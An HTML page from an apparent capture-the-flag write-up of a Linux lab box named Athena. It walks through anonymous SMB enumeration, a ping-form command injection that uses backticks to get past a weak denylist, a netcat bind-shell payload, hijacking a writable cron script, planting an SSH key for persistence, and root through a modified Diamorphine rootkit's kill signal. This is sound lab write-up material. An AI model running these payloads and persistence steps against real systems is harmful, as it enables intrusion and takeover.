@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Write-up — Athena</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+ 
+        :root {
+            --bg-primary: #080808;
+            --bg-secondary: #111111;
+            --text-primary: #e8e8e8;
+            --text-secondary: #666666;
+            --accent: #e8e8e8;
+            --accent-dim: #aaaaaa;
+            --border: #1e1e1e;
+        }
+ 
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background-color: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.7;
+            overflow-x: hidden;
+        }
+ 
+        .matrix {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            pointer-events: none;
+            z-index: -1;
+            opacity: 0.04;
+        }
+ 
+        .container {
+            max-width: 760px;
+            margin: 0 auto;
+            padding: 4rem 2rem;
+        }
+ 
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 0.85rem;
+            margin-bottom: 3rem;
+            transition: color 0.2s ease;
+        }
+ 
+        .back-link:hover { color: var(--accent); }
+ 
+        .writeup-header {
+            margin-bottom: 3rem;
+            padding-bottom: 2rem;
+            border-bottom: 1px solid var(--border);
+            animation: fadeInDown 0.7s ease-out;
+        }
+ 
+        .writeup-header h1 {
+            font-size: 2.2rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #ffffff 0%, #aaaaaa 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 1rem;
+        }
+ 
+        .writeup-tags {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+        }
+ 
+        .tag {
+            display: inline-flex;
+            align-items: center;
+            font-size: 0.72rem;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            border: 1px solid var(--border);
+            color: var(--accent-dim);
+        }
+ 
+        .tag.linux  { border-color: #2a3a2a; color: #6a9a6a; }
+        .tag.medium { border-color: #3a3a2a; color: #9a8a5a; }
+        .tag.date   { color: var(--text-secondary); border-color: var(--border); }
+ 
+        .writeup-body {
+            animation: fadeIn 0.8s ease-out 0.2s both;
+        }
+ 
+        .writeup-body h2 {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: var(--accent);
+            margin: 2.5rem 0 1rem;
+            padding-left: 0.75rem;
+            border-left: 2px solid var(--accent-dim);
+        }
+ 
+        .writeup-body p {
+            color: #b0b0b0;
+            font-size: 0.92rem;
+            margin-bottom: 1rem;
+        }
+ 
+        .writeup-body strong {
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+ 
+        pre {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.2rem 1.4rem;
+            overflow-x: auto;
+            margin: 1rem 0 1.5rem;
+        }
+ 
+        pre code {
+            font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+            font-size: 0.82rem;
+            color: #c8c8c8;
+            line-height: 1.6;
+        }
+ 
+        p code, li code {
+            font-family: 'SF Mono', 'Fira Code', monospace;
+            font-size: 0.82rem;
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            padding: 0.1rem 0.4rem;
+            border-radius: 4px;
+            color: #b8c8b8;
+        }
+ 
+        .info-box {
+            background: #0e1a0e;
+            border: 1px solid #2a3a2a;
+            border-radius: 8px;
+            padding: 1rem 1.25rem;
+            margin: 1.5rem 0;
+            font-size: 0.88rem;
+            color: #7aaa7a;
+        }
+ 
+        hr {
+            border: none;
+            border-top: 1px solid var(--border);
+            margin: 2.5rem 0;
+        }
+ 
+        .footer {
+            text-align: center;
+            margin-top: 4rem;
+            padding-top: 2rem;
+            border-top: 1px solid var(--border);
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+ 
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+ 
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateY(-20px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+ 
+        @media (max-width: 600px) {
+            .container { padding: 2rem 1rem; }
+            .writeup-header h1 { font-size: 1.6rem; }
+        }
+    </style>
+</head>
+<body>
+    <canvas class="matrix"></canvas>
+ 
+    <div class="container">
+ 
+        <a href="../writeup.html" class="back-link">&#8592; back to write-ups</a>
+ 
+        <div class="writeup-header">
+            <h1>Athena</h1>
+            <div class="writeup-tags">
+                <span class="tag linux">Linux</span>
+                <span class="tag medium">Medium</span>
+                <span class="tag date">Apr 2026</span>
+            </div>
+        </div>
+ 
+        <div class="writeup-body">
+ 
+            <h2>Enumeration</h2>
+            <p>
+                Starting with a basic Nmap scan, four ports are exposed: <strong>22 (SSH), 80 (HTTP), 139 and 445 (SMB)</strong>. The presence of SMB is interesting — I run <code>enum4linux</code> to enumerate shares.
+            </p>
+            <pre><code>enum4linux $IP</code></pre>
+            <p>
+                A share named <code>/public</code> is accessible anonymously. Connecting to it reveals a text file left by an intern.
+            </p>
+            <pre><code>cat msg_for_administrator.txt
+ 
+Dear Administrator,
+I would like to inform you that a new Ping system is being developed
+and I left the corresponding application in a specific path, which can
+be accessed through the following address: /myrouterpanel
+Yours sincerely,
+Athena
+Intern</code></pre>
+            <p>
+                Navigating to <code>/myrouterpanel</code> on port 80 reveals a web-based ping utility — a classic command injection target.
+            </p>
+ 
+            <h2>Command injection — initial foothold</h2>
+            <p>
+                The ping form sends user input directly to a shell command. Looking at the server-side code after getting a shell, the filter in place is minimal.
+            </p>
+            <pre><code>$maliciousChars = array(';', '&', '|');</code></pre>
+            <p>
+                Only three characters are blocked. <strong>Backticks are not filtered</strong>, which allows command substitution to bypass the restriction entirely. Classic reverse shell payloads fail due to network restrictions, so I opt for a <strong>bind shell</strong> instead.
+            </p>
+            <pre><code>`nc -nlvp 1337 -e /bin/sh`</code></pre>
+            <p>
+                I then connect from my machine and stabilize the shell using Python's PTY module.
+            </p>
+            <pre><code>telnet $IP 1337</code></pre>
+            <pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+            <p>
+                I land as <code>www-data</code>.
+            </p>
+ 
+            <h2>Lateral movement — www-data to athena</h2>
+            <p>
+                Running <code>linpeas.sh</code> for local enumeration, a cronjob catches my eye: a backup script writable by <code>www-data</code> and owned by the <code>athena</code> group.
+            </p>
+            <pre><code>-rwxr-xr-x 1 www-data athena 258 May 28 2023 /usr/share/backup/backup.sh</code></pre>
+            <p>
+                I replace the script content with a reverse shell, set up a Netcat listener, and wait for the cronjob to trigger. The shell comes back as <code>athena</code>.
+            </p>
+            <p>
+                To get a stable persistent session, I add my public key to <code>/home/athena/.ssh/authorized_keys</code> and reconnect via SSH.
+            </p>
+            <pre><code>echo "ssh-rsa AAAA..." >> /home/athena/.ssh/authorized_keys
+ssh athena@$IP</code></pre>
+ 
+            <h2>Privilege escalation — LKM rootkit signal abuse</h2>
+            <p>
+                Checking sudo permissions reveals something unusual.
+            </p>
+            <pre><code>sudo -l
+ 
+(root) NOPASSWD: /usr/sbin/insmod /mnt/.../secret/venom.ko</code></pre>
+            <p>
+                <code>venom.ko</code> is a Linux kernel module — a rootkit. Its <code>modinfo</code> output confirms it's based on the <strong>Diamorphine</strong> LKM rootkit by m0nad. The module is already loaded (<code>insmod</code> returns "File exists"), so the rootkit is active.
+            </p>
+            <p>
+                Diamorphine works by hooking the <code>kill</code> syscall. When a specific magic signal is sent to any process, the rootkit calls <code>give_root()</code> and elevates the process to UID 0. The default signal in the public Diamorphine source is <strong>64</strong> — but this version is modified.
+            </p>
+            <p>
+                I disassemble the module to find the actual signal comparisons inside <code>hacked_kill</code>.
+            </p>
+            <pre><code>objdump -d /mnt/.../secret/venom.ko | grep -A30 "hacked_kill"
+ 
+4ed:   83 f8 39     cmp    $0x39,%eax   ; 0x39 = 57 → give_root
+4f2:   83 f8 3f     cmp    $0x3f,%eax   ; 0x3f = 63 → module hide
+4f7:   83 f8 1f     cmp    $0x1f,%eax   ; 0x1f = 31 → process hide</code></pre>
+            <p>
+                The magic signal for <code>give_root</code> is <strong>57 (0x39)</strong>. Sending it to the current shell process and immediately reading the flag gives root.
+            </p>
+            <pre><code>sh -c 'kill -57 $$ && cat /root/root.txt'</code></pre>
+ 
+            <hr>
+ 
+            <h2>Summary</h2>
+            <p>
+                The attack chain was: <strong>SMB anonymous share</strong> &#8594; hidden web path disclosure &#8594; <strong>command injection</strong> via unfiltered backticks &#8594; bind shell as www-data &#8594; <strong>writable cronjob script</strong> &#8594; lateral move to athena &#8594; <strong>LKM rootkit signal abuse</strong> &#8594; root.
+            </p>
+            <p>
+                The key insight on the rootkit was disassembling <code>hacked_kill</code> directly rather than trusting the default Diamorphine signal. On the command injection side, incomplete denylist filtering (backticks not blocked) is a reliable bypass when common separators are restricted.
+            </p>
+ 
+        </div>
+ 
+        <footer class="footer">
+            <p>contact : revaa@proton.me</p>
+            &#169; 2026 All rights reserved.
+        </footer>
+    </div>
+ 
+    <script>
+        const canvas = document.querySelector('.matrix');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*";
+        const fontSize = 14;
+        const drops = Array(Math.floor(canvas.width / fontSize)).fill(1);
+        function draw() {
+            ctx.fillStyle = 'rgba(8,8,8,0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#c8c8c8';
+            ctx.font = fontSize + 'px monospace';
+            drops.forEach((y, i) => {
+                ctx.fillText(chars[Math.floor(Math.random() * chars.length)], i * fontSize, y * fontSize);
+                if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            });
+        }
+        setInterval(draw, 33);
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+    </script>
+</body>
+</html>
